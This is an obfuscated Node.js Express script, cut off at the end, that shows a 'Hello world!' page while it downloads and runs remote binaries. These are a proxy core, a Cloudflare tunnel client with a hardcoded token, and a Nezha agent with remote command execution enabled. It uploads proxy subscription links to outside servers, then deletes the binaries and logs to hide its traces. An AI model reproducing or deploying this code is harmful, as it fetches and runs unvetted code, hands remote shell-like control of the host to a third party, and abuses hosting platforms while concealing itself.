const _0x3262e6=_0x1d61;(function(_0x388ed8,_0x47a0cb){const _0x4fdb10=_0x1d61,_0xd6b05f=_0x388ed8();while(!![]){try{const _0xf8c21d=-parseInt(_0x4fdb10(0x190))/0x1*(parseInt(_0x4fdb10(0x1c3))/0x2)+-parseInt(_0x4fdb10(0x162))/0x3*(parseInt(_0x4fdb10(0x17e))/0x4)+parseInt(_0x4fdb10(0x196))/0x5*(-parseInt(_0x4fdb10(0x182))/0x6)+parseInt(_0x4fdb10(0x174))/0x7*(-parseInt(_0x4fdb10(0x1b0))/0x8)+-parseInt(_0x4fdb10(0x1f9))/0x9+-parseInt(_0x4fdb10(0x191))/0xa*(parseInt(_0x4fdb10(0x152))/0xb)+parseInt(_0x4fdb10(0x16c))/0xc*(parseInt(_0x4fdb10(0x18b))/0xd);if(_0xf8c21d===_0x47a0cb)break;else _0xd6b05f['push'](_0xd6b05f['shift']());}catch(_0x3595f5){_0xd6b05f['push'](_0xd6b05f['shift']());}}}(_0xf17a,0xdf096));const express=require(_0x3262e6(0x14d)),app=express(),axios=require(_0x3262e6(0x1e2)),os=require('os'),fs=require('fs'),path=require(_0x3262e6(0x1b3)),{promisify}=require(_0x3262e6(0x17d)),exec=promisify(require(_0x3262e6(0x19a))[_0x3262e6(0x1c0)]),{execSync}=require(_0x3262e6(0x19a)),UPLOAD_URL=process[_0x3262e6(0x1c6)][_0x3262e6(0x1e5)]||'',PROJECT_URL=process[_0x3262e6(0x1c6)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x3262e6(0x19c)]||![],FILE_PATH=process[_0x3262e6(0x1c6)][_0x3262e6(0x1de)]||_0x3262e6(0x179),SUB_PATH=process[_0x3262e6(0x1c6)]['SUB_PATH']||'095b1978-729f-4715-ad6a-56f3ab449706',PORT=process[_0x3262e6(0x1c6)]['SERVER_PORT']||process[_0x3262e6(0x1c6)]['PORT']||0xbb8,UUID=process['env'][_0x3262e6(0x1e3)]||_0x3262e6(0x151),NEZHA_SERVER=process['env'][_0x3262e6(0x1a0)]||'',NEZHA_PORT=process[_0x3262e6(0x1c6)][_0x3262e6(0x1bf)]||'',NEZHA_KEY=process[_0x3262e6(0x1c6)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x3262e6(0x1c6)][_0x3262e6(0x1ec)]||_0x3262e6(0x173),ARGO_AUTH=process[_0x3262e6(0x1c6)][_0x3262e6(0x194)]||_0x3262e6(0x1d3),ARGO_PORT=process[_0x3262e6(0x1c6)][_0x3262e6(0x1d8)]||0x1f41,CFIP=process[_0x3262e6(0x1c6)][_0x3262e6(0x1c7)]||_0x3262e6(0x1a6),CFPORT=process[_0x3262e6(0x1c6)][_0x3262e6(0x157)]||0x1bb,NAME=process[_0x3262e6(0x1c6)][_0x3262e6(0x14c)]||'railway';!fs[_0x3262e6(0x1ac)](FILE_PATH)?(fs[_0x3262e6(0x1d1)](FILE_PATH),console[_0x3262e6(0x17b)](FILE_PATH+_0x3262e6(0x15b))):console[_0x3262e6(0x17b)](FILE_PATH+_0x3262e6(0x1d6));function generateRandomName(){const _0x25cdeb=_0x3262e6,_0x40f96a='abcdefghijklmnopqrstuvwxyz';let _0x34c9b3='';for(let _0x5af44b=0x0;_0x5af44b<0x6;_0x5af44b++){_0x34c9b3+=_0x40f96a[_0x25cdeb(0x167)](Math[_0x25cdeb(0x200)](Math['random']()*_0x40f96a[_0x25cdeb(0x1ff)]));}return _0x34c9b3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3262e6(0x1b6)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x3262e6(0x1b6)](FILE_PATH,webName),botPath=path[_0x3262e6(0x1b6)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x3262e6(0x1b6)](FILE_PATH,_0x3262e6(0x199)),bootLogPath=path[_0x3262e6(0x1b6)](FILE_PATH,_0x3262e6(0x184)),configPath=path['join'](FILE_PATH,_0x3262e6(0x1eb));function deleteNodes(){const _0xb47561=_0x3262e6;try{if(!UPLOAD_URL)return;if(!fs[_0xb47561(0x1ac)](subPath))return;let _0x38bcc1;try{_0x38bcc1=fs[_0xb47561(0x1a8)](subPath,_0xb47561(0x150));}catch{return null;}const _0x7e4adc=Buffer[_0xb47561(0x165)](_0x38bcc1,_0xb47561(0x208))[_0xb47561(0x1ae)](_0xb47561(0x150)),_0x2e1e7d=_0x7e4adc['split']('\x0a')['filter'](_0x269c70=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x269c70));if(_0x2e1e7d[_0xb47561(0x1ff)]===0x0)return;return axios[_0xb47561(0x186)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x2e1e7d}),{'headers':{'Content-Type':'application/json'}})[_0xb47561(0x1e6)](_0x1ddb3d=>{return null;}),null;}catch(_0x4f9919){return null;}}function cleanupOldFiles(){try{const _0x10c5c1=fs['readdirSync'](FILE_PATH);_0x10c5c1['forEach'](_0xd1cb1d=>{const _0x20bc39=_0x1d61,_0x5dbad3=path[_0x20bc39(0x1b6)](FILE_PATH,_0xd1cb1d);try{const _0x6ebb49=fs[_0x20bc39(0x1f6)](_0x5dbad3);_0x6ebb49[_0x20bc39(0x17c)]()&&fs[_0x20bc39(0x1a7)](_0x5dbad3);}catch(_0x5d3d54){}});}catch(_0x46c42c){}}function _0xf17a(){const _0x212f54=['Skipping\x20adding\x20automatic\x20access\x20task','108AmTDQK','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','boot.log','/config.json\x20>/dev/null\x202>&1\x20&','post','/vmess-argo','Subscription\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','writeFileSync','13GmvFmF','https://amd64.ssss.nyc.mn/web','Content-Type','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','includes','2839NxFSuB','10rKuhyW','stream','Nodes\x20uploaded\x20successfully','ARGO_AUTH','none','284095IYcLwI','arm','split','list.txt','child_process','\x0a\x20\x20\x20\x20','AUTO_ACCESS','status','\x20-p\x20','push','NEZHA_SERVER','https://amd64.ssss.nyc.mn/agent','\x20-c\x20','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20tunnel:\x20','cdns.doon.eu.org','unlinkSync','readFileSync','php\x20running\x20error:\x20','vmess','\x20>/dev/null\x202>&1\x20&','existsSync','Empowerment\x20failed\x20for\x20','toString','tunnel.json','8qWIaDm','Error\x20executing\x20command:\x20','\x20-c\x20\x22','path','\x0a\x20\x20\x0avmess://','filter','join','\x20is\x20running','chmod','http','pkill\x20-f\x20\x22[','arm64','unshift','trojan','tls','NEZHA_PORT','exec','web\x20running\x20error:\x20','TunnelSecret','698ScMdkt','/dev/null','npm\x20running\x20error:\x20','env','CFIP','tunnel.yml','xtls-rprx-vision','Download\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','stringify','close','direct','response','/api/add-nodes','mkdirSync','send','eyJhIjoiMjY5MTA5YzVhNDQ5NDY3NzE2NmRmZThmMDY0YjZhYzciLCJ0IjoiM2RkNDgzODYtYjg5My00Y2JiLTlkZDMtNzg2ZmQ1NDk3NGY4IiwicyI6Ik1EaG1aV0ZpWlRVdFltUTFZaTAwWmpWbUxXSTROR1F0WldKbU4ySTFaR1k0TXpRNSJ9','/sub.txt\x20saved\x20successfully','/trojan-argo','\x20already\x20exists','?encryption=none&security=tls&sni=','ARGO_PORT','?security=tls&sni=','8443','has','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','then','FILE_PATH','blackhole','quic','text/plain;\x20charset=utf-8','axios','UUID','https://arm64.ssss.nyc.mn/agent','UPLOAD_URL','catch','taskkill\x20/f\x20/im\x20','del\x20/f\x20/q\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https+local://8.8.8.8/dns-query','config.json','ARGO_DOMAIN','vless','fileUrl','https://arm64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','Error\x20in\x20startserver:','automatic\x20access\x20task\x20added\x20successfully','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','App\x20is\x20running','ArgoDomain:','statSync','finish','unlink','11485314AmvfnL','nohup\x20','\x20>\x20nul\x202>&1','get','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','config.yaml','length','floor','Unhandled\x20error\x20in\x20startserver:','tcp','substring','test','platform','.exe\x20>\x20nul\x202>&1','2053','base64','2096','NAME','express','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','clear','utf-8','095b1978-729f-4715-ad6a-56f3ab449706','14305093vvzySH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','message','&path=%2Ftrojan-argo%3Fed%3D2560#','CFPORT','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/web','2087','\x20is\x20created','match','win32','\x20failed:\x20','&path=%2Fvless-argo%3Fed%3D2560#','127.0.0.1','fileName','94593NQgAWN','listen','\x20-s\x20','from','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','charAt','basename','freedom','/vless-argo','/vmess-argo?ed=2560','86655876cDMsyv','true','aarch64','error','rm\x20-rf\x20','https://oooo.serv00.net/add-url','2083','fly.io.c.6.8.b.0.d.0.0.1.0.a.2.ip6.arpa','7608881ChyfGF','\x0a\x20\x20\x0atrojan://','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','application/json','block','./tmp','https://amd64.ssss.nyc.mn/bot','log','isFile','util','80KuFiBH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http\x20server\x20is\x20running\x20on\x20port:'];_0xf17a=function(){return _0x212f54;};return _0xf17a();}app[_0x3262e6(0x1fc)]('/',function(_0xce9f60,_0xf7bd11){const _0x51c04d=_0x3262e6;_0xf7bd11[_0x51c04d(0x1d2)]('Hello\x20world!');});async function generateConfig(){const _0x4d2ccc=_0x3262e6,_0x470097={'log':{'access':_0x4d2ccc(0x1c4),'error':_0x4d2ccc(0x1c4),'loglevel':_0x4d2ccc(0x195)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4d2ccc(0x1c9)}],'decryption':_0x4d2ccc(0x195),'fallbacks':[{'dest':0xbb9},{'path':_0x4d2ccc(0x16a),'dest':0xbba},{'path':_0x4d2ccc(0x187),'dest':0xbbb},{'path':_0x4d2ccc(0x1d5),'dest':0xbbc}]},'streamSettings':{'network':_0x4d2ccc(0x202)}},{'port':0xbb9,'listen':_0x4d2ccc(0x160),'protocol':_0x4d2ccc(0x1ed),'settings':{'clients':[{'id':UUID}],'decryption':_0x4d2ccc(0x195)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x4d2ccc(0x160),'protocol':_0x4d2ccc(0x1ed),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4d2ccc(0x195)},'streamSettings':{'network':'ws','security':_0x4d2ccc(0x195),'wsSettings':{'path':_0x4d2ccc(0x16a)}},'sniffing':{'enabled':!![],'destOverride':[_0x4d2ccc(0x1b9),_0x4d2ccc(0x1be),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4d2ccc(0x160),'protocol':_0x4d2ccc(0x1aa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4d2ccc(0x187)}},'sniffing':{'enabled':!![],'destOverride':[_0x4d2ccc(0x1b9),_0x4d2ccc(0x1be),_0x4d2ccc(0x1e0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4d2ccc(0x160),'protocol':_0x4d2ccc(0x1bd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4d2ccc(0x1d5)}},'sniffing':{'enabled':!![],'destOverride':[_0x4d2ccc(0x1b9),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4d2ccc(0x1ea)]},'outbounds':[{'protocol':_0x4d2ccc(0x169),'tag':_0x4d2ccc(0x1ce)},{'protocol':_0x4d2ccc(0x1df),'tag':_0x4d2ccc(0x178)}]};fs[_0x4d2ccc(0x18a)](path[_0x4d2ccc(0x1b6)](FILE_PATH,_0x4d2ccc(0x1eb)),JSON[_0x4d2ccc(0x1cc)](_0x470097,null,0x2));}function getSystemArchitecture(){const _0x2dea90=_0x3262e6,_0x4090fb=os['arch']();return _0x4090fb===_0x2dea90(0x197)||_0x4090fb===_0x2dea90(0x1bb)||_0x4090fb===_0x2dea90(0x16e)?_0x2dea90(0x197):'amd';}function downloadFile(_0x48b398,_0x48e514,_0x1c3654){const _0x55306c=_0x3262e6,_0x60de71=_0x48b398;!fs[_0x55306c(0x1ac)](FILE_PATH)&&fs[_0x55306c(0x1d1)](FILE_PATH,{'recursive':!![]});const _0x3ec9ee=fs['createWriteStream'](_0x60de71);axios({'method':_0x55306c(0x1fc),'url':_0x48e514,'responseType':_0x55306c(0x192)})[_0x55306c(0x1dd)](_0x37d1f4=>{const _0xaca6ae=_0x55306c;_0x37d1f4['data']['pipe'](_0x3ec9ee),_0x3ec9ee['on'](_0xaca6ae(0x1f7),()=>{const _0x4601a1=_0xaca6ae;_0x3ec9ee[_0x4601a1(0x1cd)](),console[_0x4601a1(0x17b)](_0x4601a1(0x1ca)+path[_0x4601a1(0x168)](_0x60de71)+'\x20successfully'),_0x1c3654(null,_0x60de71);}),_0x3ec9ee['on'](_0xaca6ae(0x16f),_0x377bc1=>{const _0x59bc69=_0xaca6ae;fs[_0x59bc69(0x1f8)](_0x60de71,()=>{});const _0x2e06b3='Download\x20'+path[_0x59bc69(0x168)](_0x60de71)+_0x59bc69(0x15e)+_0x377bc1[_0x59bc69(0x155)];console[_0x59bc69(0x16f)](_0x2e06b3),_0x1c3654(_0x2e06b3);});})['catch'](_0x5be561=>{const _0xf98634=_0x55306c,_0x8b77d8=_0xf98634(0x1ca)+path[_0xf98634(0x168)](_0x60de71)+_0xf98634(0x15e)+_0x5be561[_0xf98634(0x155)];console['error'](_0x8b77d8),_0x1c3654(_0x8b77d8);});}async function downloadFilesAndRun(){const _0x2ebdf3=_0x3262e6,_0x579967=getSystemArchitecture(),_0x17a007=getFilesForArchitecture(_0x579967);if(_0x17a007['length']===0x0){console[_0x2ebdf3(0x17b)](_0x2ebdf3(0x18e));return;}const _0x3696da=_0x17a007['map'](_0x63660b=>{return new Promise((_0x5a90d8,_0x28b85c)=>{const _0x336dd0=_0x1d61;downloadFile(_0x63660b[_0x336dd0(0x161)],_0x63660b[_0x336dd0(0x1ee)],(_0x3f02ff,_0x31b906)=>{_0x3f02ff?_0x28b85c(_0x3f02ff):_0x5a90d8(_0x31b906);});});});try{await Promise['all'](_0x3696da);}catch(_0x30b65d){console['error']('Error\x20downloading\x20files:',_0x30b65d);return;}function _0xcaea33(_0x3ac3d5){const _0x5bb8b1=0x1fd;_0x3ac3d5['forEach'](_0x2084e4=>{const _0x2f8de6=_0x1d61;fs[_0x2f8de6(0x1ac)](_0x2084e4)&&fs[_0x2f8de6(0x1b8)](_0x2084e4,_0x5bb8b1,_0x1f8261=>{const _0x48c8ea=_0x2f8de6;_0x1f8261?console[_0x48c8ea(0x16f)](_0x48c8ea(0x1ad)+_0x2084e4+':\x20'+_0x1f8261):console[_0x48c8ea(0x17b)]('Empowerment\x20success\x20for\x20'+_0x2084e4+':\x20'+_0x5bb8b1['toString'](0x8));});});}const _0x3ea80a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xcaea33(_0x3ea80a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1caba5=NEZHA_SERVER[_0x2ebdf3(0x18f)](':')?NEZHA_SERVER[_0x2ebdf3(0x198)](':')['pop']():'',_0x32ed24=new Set(['443',_0x2ebdf3(0x1da),_0x2ebdf3(0x209),_0x2ebdf3(0x15a),'2083',_0x2ebdf3(0x207)]),_0x308e2a=_0x32ed24[_0x2ebdf3(0x1db)](_0x1caba5)?_0x2ebdf3(0x16d):'false',_0x145615='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2ebdf3(0x166)+NEZHA_SERVER+_0x2ebdf3(0x153)+_0x308e2a+_0x2ebdf3(0x154)+UUID;fs[_0x2ebdf3(0x18a)](path['join'](FILE_PATH,_0x2ebdf3(0x1fe)),_0x145615);const _0x1f5172=_0x2ebdf3(0x1fa)+phpPath+_0x2ebdf3(0x1b2)+FILE_PATH+_0x2ebdf3(0x14e);try{await exec(_0x1f5172),console[_0x2ebdf3(0x17b)](phpName+_0x2ebdf3(0x1b7)),await new Promise(_0x4b0ca3=>setTimeout(_0x4b0ca3,0x3e8));}catch(_0x425a0c){console[_0x2ebdf3(0x16f)](_0x2ebdf3(0x1a9)+_0x425a0c);}}else{let _0x419f53='';const _0x483369=['443',_0x2ebdf3(0x1da),_0x2ebdf3(0x209),_0x2ebdf3(0x15a),_0x2ebdf3(0x172),'2053'];_0x483369[_0x2ebdf3(0x18f)](NEZHA_PORT)&&(_0x419f53='--tls');const _0xa2401e=_0x2ebdf3(0x1fa)+npmPath+_0x2ebdf3(0x164)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2ebdf3(0x19e)+NEZHA_KEY+'\x20'+_0x419f53+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xa2401e),console[_0x2ebdf3(0x17b)](npmName+_0x2ebdf3(0x1b7)),await new Promise(_0x5cb8b0=>setTimeout(_0x5cb8b0,0x3e8));}catch(_0x1260fd){console[_0x2ebdf3(0x16f)](_0x2ebdf3(0x1c5)+_0x1260fd);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x187d14='nohup\x20'+webPath+_0x2ebdf3(0x1a2)+FILE_PATH+_0x2ebdf3(0x185);try{await exec(_0x187d14),console['log'](webName+_0x2ebdf3(0x1b7)),await new Promise(_0x1d6025=>setTimeout(_0x1d6025,0x3e8));}catch(_0x481801){console[_0x2ebdf3(0x16f)](_0x2ebdf3(0x1c1)+_0x481801);}if(fs[_0x2ebdf3(0x1ac)](botPath)){let _0x5c1b4f;if(ARGO_AUTH[_0x2ebdf3(0x15c)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c1b4f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x5c1b4f='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x5c1b4f=_0x2ebdf3(0x189)+FILE_PATH+_0x2ebdf3(0x1e9)+ARGO_PORT;try{await exec(_0x2ebdf3(0x1fa)+botPath+'\x20'+_0x5c1b4f+_0x2ebdf3(0x1ab)),console[_0x2ebdf3(0x17b)](botName+_0x2ebdf3(0x1b7)),await new Promise(_0x23e2a4=>setTimeout(_0x23e2a4,0x7d0));}catch(_0x235252){console['error'](_0x2ebdf3(0x1b1)+_0x235252);}}await new Promise(_0x5a3eb9=>setTimeout(_0x5a3eb9,0x1388));}function getFilesForArchitecture(_0x26c55c){const _0x495768=_0x3262e6;let _0x4f91a3;_0x26c55c===_0x495768(0x197)?_0x4f91a3=[{'fileName':webPath,'fileUrl':_0x495768(0x159)},{'fileName':botPath,'fileUrl':_0x495768(0x1ef)}]:_0x4f91a3=[{'fileName':webPath,'fileUrl':_0x495768(0x18c)},{'fileName':botPath,'fileUrl':_0x495768(0x17a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4b021c=_0x26c55c==='arm'?_0x495768(0x1e4):_0x495768(0x1a1);_0x4f91a3[_0x495768(0x1bc)]({'fileName':npmPath,'fileUrl':_0x4b021c});}else{const _0x38272f=_0x26c55c===_0x495768(0x197)?_0x495768(0x1a3):_0x495768(0x1a4);_0x4f91a3['unshift']({'fileName':phpPath,'fileUrl':_0x38272f});}}return _0x4f91a3;}function argoType(){const _0x19ae58=_0x3262e6;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x19ae58(0x18f)](_0x19ae58(0x1c2))){fs[_0x19ae58(0x18a)](path[_0x19ae58(0x1b6)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x6be553=_0x19ae58(0x1a5)+ARGO_AUTH[_0x19ae58(0x198)]('\x22')[0xb]+_0x19ae58(0x158)+path[_0x19ae58(0x1b6)](FILE_PATH,_0x19ae58(0x1af))+_0x19ae58(0x17f)+ARGO_DOMAIN+_0x19ae58(0x1dc)+ARGO_PORT+_0x19ae58(0x1cb);fs['writeFileSync'](path['join'](FILE_PATH,_0x19ae58(0x1c8)),_0x6be553);}else console[_0x19ae58(0x17b)](_0x19ae58(0x1f3));}argoType();async function extractDomains(){const _0x1528ba=_0x3262e6;let _0x32c8bc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x32c8bc=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x32c8bc),await _0x102d99(_0x32c8bc);else try{const _0x22f8f6=fs[_0x1528ba(0x1a8)](path[_0x1528ba(0x1b6)](FILE_PATH,_0x1528ba(0x184)),_0x1528ba(0x150)),_0x392fca=_0x22f8f6[_0x1528ba(0x198)]('\x0a'),_0x81833c=[];_0x392fca['forEach'](_0x51c79d=>{const _0x3b9050=_0x1528ba,_0x96e4a4=_0x51c79d[_0x3b9050(0x15c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x96e4a4){const _0x26de73=_0x96e4a4[0x1];_0x81833c[_0x3b9050(0x19f)](_0x26de73);}});if(_0x81833c['length']>0x0)_0x32c8bc=_0x81833c[0x0],console[_0x1528ba(0x17b)](_0x1528ba(0x1f5),_0x32c8bc),await _0x102d99(_0x32c8bc);else{console[_0x1528ba(0x17b)](_0x1528ba(0x176)),fs[_0x1528ba(0x1a7)](path[_0x1528ba(0x1b6)](FILE_PATH,'boot.log'));async function _0x2c97a1(){const _0xfcdc7e=_0x1528ba;try{process[_0xfcdc7e(0x205)]===_0xfcdc7e(0x15d)?await exec(_0xfcdc7e(0x1e7)+botName+_0xfcdc7e(0x206)):await exec(_0xfcdc7e(0x1ba)+botName[_0xfcdc7e(0x167)](0x0)+']'+botName[_0xfcdc7e(0x203)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1001e3){}}_0x2c97a1(),await new Promise(_0x31e993=>setTimeout(_0x31e993,0xbb8));const _0x164a89=_0x1528ba(0x189)+FILE_PATH+_0x1528ba(0x1e9)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x164a89+'\x20>/dev/null\x202>&1\x20&'),console[_0x1528ba(0x17b)](botName+_0x1528ba(0x1b7)),await new Promise(_0x17786d=>setTimeout(_0x17786d,0xbb8)),await extractDomains();}catch(_0x599ef1){console['error'](_0x1528ba(0x1b1)+_0x599ef1);}}}catch(_0x2839d5){console[_0x1528ba(0x16f)]('Error\x20reading\x20boot.log:',_0x2839d5);}async function _0x102d99(_0x4328d7){const _0x3032e6=_0x1528ba,_0x5dd5eb=execSync(_0x3032e6(0x1fd),{'encoding':_0x3032e6(0x150)}),_0x2fcdcb=_0x5dd5eb['trim'](),_0x50cdf9=NAME?NAME+'-'+_0x2fcdcb:_0x2fcdcb;return new Promise(_0x6d0c98=>{setTimeout(()=>{const _0x5eb0f7=_0x1d61,_0x85f3bb={'v':'2','ps':''+_0x50cdf9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5eb0f7(0x195),'net':'ws','type':_0x5eb0f7(0x195),'host':_0x4328d7,'path':_0x5eb0f7(0x16b),'tls':_0x5eb0f7(0x1be),'sni':_0x4328d7,'alpn':'','fp':'firefox'},_0x21c5ee='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5eb0f7(0x1d7)+_0x4328d7+_0x5eb0f7(0x1f0)+_0x4328d7+_0x5eb0f7(0x15f)+_0x50cdf9+_0x5eb0f7(0x1b4)+Buffer[_0x5eb0f7(0x165)](JSON[_0x5eb0f7(0x1cc)](_0x85f3bb))[_0x5eb0f7(0x1ae)](_0x5eb0f7(0x208))+_0x5eb0f7(0x175)+UUID+'@'+CFIP+':'+CFPORT+_0x5eb0f7(0x1d9)+_0x4328d7+'&fp=firefox&type=ws&host='+_0x4328d7+_0x5eb0f7(0x156)+_0x50cdf9+_0x5eb0f7(0x19b);console['log'](Buffer[_0x5eb0f7(0x165)](_0x21c5ee)[_0x5eb0f7(0x1ae)](_0x5eb0f7(0x208))),fs[_0x5eb0f7(0x18a)](subPath,Buffer['from'](_0x21c5ee)[_0x5eb0f7(0x1ae)](_0x5eb0f7(0x208))),console[_0x5eb0f7(0x17b)](FILE_PATH+_0x5eb0f7(0x1d4)),uploadNodes(),app[_0x5eb0f7(0x1fc)]('/'+SUB_PATH,(_0x30eed2,_0x18409b)=>{const _0x253120=_0x5eb0f7,_0x210897=Buffer[_0x253120(0x165)](_0x21c5ee)[_0x253120(0x1ae)](_0x253120(0x208));_0x18409b['set'](_0x253120(0x18d),_0x253120(0x1e1)),_0x18409b[_0x253120(0x1d2)](_0x210897);}),_0x6d0c98(_0x21c5ee);},0x7d0);});}}function _0x1d61(_0x2bb8db,_0x1887a2){const _0xf17aa5=_0xf17a();return _0x1d61=function(_0x1d6141,_0x578049){_0x1d6141=_0x1d6141-0x14c;let _0x1ea566=_0xf17aa5[_0x1d6141];return _0x1ea566;},_0x1d61(_0x2bb8db,_0x1887a2);}async function uploadNodes(){const _0x359981=_0x3262e6;if(UPLOAD_URL&&PROJECT_URL){const _0x506c45=PROJECT_URL+'/'+SUB_PATH,_0x171bdf={'subscription':[_0x506c45]};try{const _0x5dfc49=await axios[_0x359981(0x186)](UPLOAD_URL+'/api/add-subscriptions',_0x171bdf,{'headers':{'Content-Type':_0x359981(0x177)}});return _0x5dfc49&&_0x5dfc49['status']===0xc8?(console[_0x359981(0x17b)](_0x359981(0x188)),_0x5dfc49):null;}catch(_0x2ff52d){if(_0x2ff52d['response']){if(_0x2ff52d[_0x359981(0x1cf)][_0x359981(0x19d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x359981(0x1ac)](listPath))return;const _0xcbdf=fs['readFileSync'](listPath,'utf-8'),_0x26382b=_0xcbdf[_0x359981(0x198)]('\x0a')[_0x359981(0x1b5)](_0x1ccb11=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x359981(0x204)](_0x1ccb11));if(_0x26382b[_0x359981(0x1ff)]===0x0)return;const _0x303e11=JSON[_0x359981(0x1cc)]({'nodes':_0x26382b});try{const _0x1d51ee=await axios[_0x359981(0x186)](UPLOAD_URL+_0x359981(0x1d0),_0x303e11,{'headers':{'Content-Type':'application/json'}});return _0x1d51ee&&_0x1d51ee[_0x359981(0x19d)]===0xc8?(console[_0x359981(0x17b)](_0x359981(0x193)),_0x1d51ee):null;}catch(_0x586bb5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x53c127=_0x1d61,_0x294056=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x294056[_0x53c127(0x19f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x294056[_0x53c127(0x19f)](phpPath);process['platform']===_0x53c127(0x15d)?exec(_0x53c127(0x1e8)+_0x294056['join']('\x20')+_0x53c127(0x1fb),_0x5ae931=>{const _0x3410b6=_0x53c127;console[_0x3410b6(0x14f)](),console['log'](_0x3410b6(0x1f4)),console[_0x3410b6(0x17b)](_0x3410b6(0x183));}):exec(_0x53c127(0x170)+_0x294056[_0x53c127(0x1b6)]('\x20')+'\x20>/dev/null\x202>&1',_0x3be3a3=>{const _0x55f27e=_0x53c127;console[_0x55f27e(0x14f)](),console[_0x55f27e(0x17b)](_0x55f27e(0x1f4)),console['log'](_0x55f27e(0x183));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x192667=_0x3262e6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x192667(0x17b)](_0x192667(0x181));return;}try{const _0x3fb32c=await axios[_0x192667(0x186)](_0x192667(0x171),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x192667(0x17b)](_0x192667(0x1f2)),_0x3fb32c;}catch(_0x498750){return console[_0x192667(0x16f)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x498750['message']),null;}}async function startserver(){const _0x4f7844=_0x3262e6;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 